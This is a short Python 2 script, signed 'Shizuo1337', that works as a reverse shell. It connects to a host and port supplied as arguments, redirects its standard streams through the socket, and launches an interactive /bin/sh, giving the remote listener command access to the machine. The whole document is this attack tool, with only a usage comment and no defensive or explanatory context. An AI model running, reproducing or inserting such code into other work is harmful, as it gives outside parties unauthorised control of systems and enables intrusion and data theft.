#!/usr/bin/python
#Usage: python filename.py HOST PORT
import sys, socket, os, subprocess
iplo = sys.argv[1]
portlo = int(sys.argv[2])
socket.setdefaulttimeout(60)
def pybackconnect():
  try:
    jmb = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    jmb.connect((iplo,portlo))
    jmb.send('''\nPython BackConnect By Shizuo1337\n\n''')
    os.dup2(jmb.fileno(),0)
    os.dup2(jmb.fileno(),1)
    os.dup2(jmb.fileno(),2)
    os.dup2(jmb.fileno(),3)
    shell = subprocess.call(["/bin/sh","-i"])
  except socket.timeout:
    print "TimOut"
  except socket.error, e:
    print "Error", e
pybackconnect()
